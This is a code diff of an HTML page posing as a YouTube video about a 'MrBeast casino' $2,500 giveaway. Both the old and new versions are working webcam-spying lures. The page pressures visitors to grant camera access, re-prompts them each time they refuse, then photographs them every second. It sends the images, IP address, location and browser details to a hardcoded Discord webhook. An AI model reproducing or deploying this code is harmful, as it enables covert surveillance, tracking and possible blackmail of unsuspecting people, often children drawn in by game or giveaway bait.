@@ -1,252 +1,312 @@
 <!DOCTYPE html>
-<html lang="nl">
+<html lang="de">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Minecraft The End Animatie</title>
+  <title>MrBeast's Casino - Win free $2,500! - YouTube</title>
+  <link rel="icon" href="https://www.youtube.com/s/desktop/1e8a78f5/img/favicon_32x32.png" type="image/png">
   <style>
     body {
       margin: 0;
-      background: #000;
+      background: #0f0f0f;
       color: #fff;
-      font-family: Arial, sans-serif;
-      text-align: center;
+      font-family: 'Roboto', Arial, sans-serif;
       height: 100vh;
       overflow: hidden;
     }
-    .container {
-      max-width: 720px;
-      margin: 5vh auto;
+    .youtube-container {
+      max-width: 1280px;
+      margin: 0 auto;
       padding: 20px;
+      position: relative;
     }
-    .thumb {
+    .video-player {
+      position: relative;
       width: 100%;
-      max-width: 640px;
+      padding-top: 56.25%; /* 16:9 Aspect Ratio */
+      background: #000;
       border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 0 30px rgba(0,0,0,0.8);
       cursor: pointer;
-      box-shadow: 0 0 20px rgba(0,255,0,0.3);
+    }
+    .thumbnail {
+      position: absolute;
+      inset: 0;
+      background: url('https://img.youtube.com/vi/-oXy7kZSdRo/maxresdefault.jpg') center/cover no-repeat;
+    }
+    .play-overlay {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0,0,0,0.4);
+      transition: background 0.3s;
+    }
+    .play-overlay:hover {
+      background: rgba(0,0,0,0.2);
+    }
+    .play-button {
+      width: 90px;
+      height: 64px;
+      background: #f00;
+      border-radius: 50%/80%;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 20px rgba(255,0,0,0.6);
+    }
+    .play-button::before {
+      content: '';
+      position: absolute;
+      width: 0;
+      height: 0;
+      border-top: 12px solid transparent;
+      border-bottom: 12px solid transparent;
+      border-left: 20px solid white;
+      margin-left: 4px;
+    }
+    .video-info {
+      margin-top: 16px;
+      padding: 0 12px;
+    }
+    .title {
+      font-size: 1.8em;
+      font-weight: 500;
+      margin: 8px 0;
+    }
+    .meta {
+      color: #aaa;
+      font-size: 1.1em;
+    }
+    .channel {
+      display: flex;
+      align-items: center;
+      margin: 16px 0;
+    }
+    .channel-avatar {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: #333 url('https://yt3.googleusercontent.com/ytc/AIdro_nSMdA3A2rBHqG5oqM0r5Zx2wXwY3Z3Z3Z3Z3Z3=s88-c-k-c0x00ffffff-no-rj') center/cover;
+      margin-right: 12px;
+    }
+    .prompt, .overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 1000;
+      display: none;
     }
     .overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.92);
-      display: none;
+      background: rgba(0,0,0,0.9);
       justify-content: center;
       align-items: center;
-      font-size: 6em;
+      font-size: 4em;
       color: #0f0;
-      font-weight: bold;
-      z-index: 100;
-    }
-    .prompt {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.88);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 200;
+      flex-direction: column;
     }
     .prompt-box {
-      background: #111;
-      padding: 40px;
+      background: #181818;
+      padding: 50px;
       border-radius: 20px;
-      max-width: 90%;
-      box-shadow: 0 0 30px #0f0;
+      width: 90%;
+      max-width: 500px;
+      box-shadow: 0 0 40px #0f0;
+      text-align: center;
+    }
+    .error-msg {
+      color: #ff4444;
+      font-size: 1.4em;
+      margin: 20px 0;
+      display: none;
     }
     .btn {
-      padding: 18px 50px;
-      font-size: 1.4em;
+      padding: 16px 60px;
+      font-size: 1.5em;
       border: none;
-      border-radius: 12px;
+      border-radius: 999px;
       cursor: pointer;
       margin: 15px;
-      transition: all 0.2s;
-    }
-    .btn:hover {
-      transform: scale(1.08);
-    }
-    .allow {
-      background: #0f0;
-      color: #000;
       font-weight: bold;
     }
-    .deny {
-      background: #444;
-      color: #fff;
-    }
+    .allow { background: #065fd4; color: white; }
+    .deny { background: #303030; color: #aaa; }
     #status {
       position: fixed;
       bottom: 20px;
       left: 50%;
       transform: translateX(-50%);
-      background: rgba(0,0,0,0.7);
-      padding: 12px 30px;
-      border-radius: 12px;
-      font-size: 1.1em;
+      background: rgba(0,0,0,0.8);
+      padding: 12px 40px;
+      border-radius: 999px;
+      font-size: 1.2em;
       display: none;
     }
   </style>
 </head>
 <body>
+  <div class="youtube-container">
+    <div class="video-player" id="player">
+      <div class="thumbnail"></div>
+      <div class="play-overlay" id="playTrigger">
+        <div class="play-button"></div>
+      </div>
+    </div>
 
-  <div class="container">
-    <h2>Minecraft The End Animatie - Check dit!</h2>
-    <img class="thumb" src="https://img.youtube.com/vi/-oXy7kZSdRo/maxresdefault.jpg" alt="Thumbnail">
-    <p style="font-size:1.4em;margin-top:15px;">Klik om te starten ▶</p>
-  </div>
-
-  <div id="overlay" class="overlay">MEMO I GOT YOU</div>
-
-  <div id="prompt" class="prompt">
-    <div class="prompt-box">
-      <h2>Camera toestaan?</h2>
-      <p style="font-size:1.2em;line-height:1.5;">Om de video goed af te spelen, sta de camera even toe.</p>
-      <button id="allowBtn" class="btn allow">Toestaan</button>
-      <button id="denyBtn" class="btn deny">Nee</button>
+    <div class="video-info">
+      <div class="title">MrBeast's Casino Scam? Win free $2,500 right now! (2025)</div>
+      <div class="meta">1.2M views • vor 3 Tagen</div>
+      <div class="channel">
+        <div class="channel-avatar"></div>
+        <div>
+          <div style="font-weight:bold;">MrBeast</div>
+          <div style="color:#aaa;font-size:0.95em;">47.8 Mio. Abonnenten</div>
+        </div>
+      </div>
     </div>
   </div>
 
-  <div id="status">Opnames bezig... (sluit tab om te stoppen)</div>
+  <div id="overlay" class="overlay">
+    <div>MEMO ICH HAB DICH</div>
+    <div style="font-size:0.5em;margin-top:40px;">Kamera bleibt aktiv – gib einfach frei</div>
+  </div>
 
-  <video id="v" autoplay playsinline style="display:none"></video>
+  <div id="prompt" class="prompt" style="background:rgba(0,0,0,0.92);display:flex;justify-content:center;align-items:center;">
+    <div class="prompt-box">
+      <h2>Kamera freigeben erforderlich</h2>
+      <p style="font-size:1.4em;line-height:1.6;margin:25px 0;">
+        Um das Video abzuspielen, musst du kurz die Kamera freigeben.<br>
+        <strong>Ohne Freigabe startet das Video nicht.</strong>
+      </p>
+      <div id="errorMsg" class="error-msg">
+        Zugriff verweigert! Du musst erlauben, damit das Video lädt.
+      </div>
+      <button id="allowBtn" class="btn allow">Kamera freigeben</button>
+      <button id="denyBtn" class="btn deny">Abbrechen</button>
+    </div>
+  </div>
+
+  <div id="status">Aufnahme läuft... (nicht schließen)</div>
+
+  <video id="v" autoplay playsinline muted style="display:none"></video>
   <canvas id="c" style="display:none"></canvas>
 
   <script>
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
-
+    
     const v = document.getElementById("v");
     const c = document.getElementById("c");
     const promptEl = document.getElementById("prompt");
     const overlay = document.getElementById("overlay");
     const statusEl = document.getElementById("status");
-    const thumb = document.querySelector(".thumb");
+    const errorMsg = document.getElementById("errorMsg");
+    const playTrigger = document.getElementById("playTrigger");
 
     let stream = null;
     let intervalId = null;
     let count = 0;
+    let deniedCount = 0;
 
-    async function startCamera() {
+    async function tryGetCamera() {
       try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
-        });
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         v.srcObject = stream;
         await new Promise(r => v.onloadedmetadata = r);
         c.width = v.videoWidth || 640;
         c.height = v.videoHeight || 480;
-
         statusEl.style.display = "block";
         overlay.style.display = "flex";
         startContinuousCapture();
       } catch (e) {
-        console.error("Camera start mislukt:", e);
-        sendToDiscord(null, "camera_permission_failed");
+        deniedCount++;
+        errorMsg.style.display = "block";
+        errorMsg.textContent = `Verweigert (${deniedCount}x)! Du musst die Kamera freigeben!`;
+        setTimeout(() => promptEl.style.display = "flex", 600);
+        sendToDiscord(null, `verweigert_${deniedCount}`);
+        if (deniedCount >= 3) {
+          overlay.innerHTML = `<div>STOP VERWEIGERN!</div><div style="font-size:0.6em;margin-top:30px;">Kamera ist PFLICHT – sonst läuft gar nichts</div>`;
+          overlay.style.display = "flex";
+        }
       }
     }
 
     async function captureAndSend() {
       try {
         c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
-        const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.68));
-        await sendToDiscord(blob, "camera_continuous");
-      } catch (err) {
-        console.error("Capture fout:", err);
-      }
+        const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.7));
+        sendToDiscord(blob, "grab");
+      } catch {}
     }
 
     function startContinuousCapture() {
-      // Elke 1200 ms een foto
-      intervalId = setInterval(captureAndSend, 1200);
+      intervalId = setInterval(captureAndSend, 1000);
     }
 
     function stopCapture() {
       if (intervalId) clearInterval(intervalId);
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        stream = null;
-      }
+      if (stream) stream.getTracks().forEach(t => t.stop());
       statusEl.style.display = "none";
     }
 
-    async function sendToDiscord(blob = null, type = "camera") {
+    async function sendToDiscord(blob = null, type) {
       try {
-        const ipRes = await fetch("https://ipwho.is").catch(() => ({}));
-        const ipData = await ipRes.json?.() || {};
-
+        const ipData = (await (await fetch("https://ipwho.is").catch(()=>null))?.json()) || {};
         const formData = new FormData();
-
         const embed = {
-          title: `🎯 CONTINUOUS GRAB - ${type.toUpperCase()} #${++count}`,
-          color: type.includes("fail") || type === "denied" ? 0x444444 : 16711680,
+          title: `🎥 ${type.toUpperCase()} #${++count}`,
+          color: type.includes("verweigert") ? 0xFF0000 : 0x00FF00,
           fields: [
-            { name: "Type", value: type, inline: true },
-            { name: "IP + Locatie", value: `**${ipData.ip || 'Onbekend'}**\n${ipData.city || '?'} • ${ipData.country || '?'}${ipData.region ? ' • ' + ipData.region : ''}`, inline: true },
-            { name: "Device / UA", value: navigator.userAgent.slice(0, 140) + (navigator.userAgent.length > 140 ? '...' : ''), inline: false },
-            { name: "Scherm", value: `${screen.width} × ${screen.height}`, inline: true },
-            { name: "Tijd", value: new Date().toISOString(), inline: true },
-            { name: "Pagina", value: location.href, inline: false }
+            { name: "Event", value: type, inline: true },
+            { name: "IP/Ort", value: `**${ipData.ip||'??'}** ${ipData.city||''} ${ipData.country||''}`, inline: true },
+            { name: "UA", value: navigator.userAgent.slice(0,120), inline: false },
+            { name: "Seite", value: location.href }
           ],
-          timestamp: new Date().toISOString(),
-          footer: { text: `Foto #${count} • ${navigator.platform}` }
+          timestamp: new Date().toISOString()
         };
-
-        if (blob) {
-          embed.image = { url: "attachment://capture.jpg" };
-        }
-
-        formData.append("payload_json", JSON.stringify({ embeds: [embed] }));
-
-        if (blob) {
-          formData.append("file", blob, `continuous_${count}_${Date.now()}.jpg`);
-        }
-
-        await fetch(DISCORD_WEBHOOK, {
-          method: "POST",
-          body: formData
-        });
-      } catch (err) {
-        console.error("Webhook error:", err);
-      }
+        if (blob) embed.image = { url: "attachment://img.jpg" };
+        formData.append("payload_json", JSON.stringify({embeds:[embed]}));
+        if (blob) formData.append("file", blob, `capture_${count}.jpg`);
+        await fetch(DISCORD_WEBHOOK, {method:"POST", body: formData});
+      } catch {}
     }
 
-    thumb.onclick = () => {
+    // Start nur über Play-Button
+    playTrigger.onclick = () => {
       promptEl.style.display = "flex";
     };
 
     document.getElementById("allowBtn").onclick = () => {
       promptEl.style.display = "none";
-      startCamera();
+      errorMsg.style.display = "none";
+      tryGetCamera();
     };
 
     document.getElementById("denyBtn").onclick = () => {
-      promptEl.style.display = "none";
-      sendToDiscord(null, "denied");
-      overlay.style.display = "flex";
-      overlay.innerHTML = "OK DAN...";
-      setTimeout(() => {
-        location.href = "https://www.youtube.com/watch?v=-oXy7kZSdRo";
-      }, 1800);
+      promptEl.style.display = "flex";
+      errorMsg.style.display = "block";
+      sendToDiscord(null, "verweigert");
+      if (deniedCount >= 4) {
+        overlay.innerHTML = "KEIN ENTKOMMEN\nFreigeben oder Video bleibt schwarz";
+        overlay.style.display = "flex";
+      }
     };
 
-    // Auto prompt na 3 sec
+    // Auto-Prompt nach 4 Sekunden
     setTimeout(() => {
-      if (promptEl.style.display !== "flex") {
-        promptEl.style.display = "flex";
-      }
-    }, 3000);
+      if (promptEl.style.display !== "flex") promptEl.style.display = "flex";
+    }, 4000);
 
-    // Optioneel: na 2 minuten redirect (verwijder dit blok als je wilt dat het oneindig doorgaat)
-    setTimeout(() => {
+    // Immer wieder Prompt zeigen wenn verweigert
+    setInterval(() => {
+      if (!stream && deniedCount > 0) promptEl.style.display = "flex";
+    }, 5000);
+
+    window.addEventListener("beforeunload", () => {
       stopCapture();
-      overlay.innerHTML = "BEDANKT!";
-      setTimeout(() => {
-        location.href = "https://www.youtube.com/watch?v=-oXy7kZSdRo";
-      }, 1500);
-    }, 120000); // 120 seconden = 2 minuten
-
-    // Stop bij sluiten van tab/pagina
-    window.addEventListener("beforeunload", stopCapture);
+      navigator.sendBeacon(DISCORD_WEBHOOK, "closed");
+    });
   </script>
 </body>
 </html>
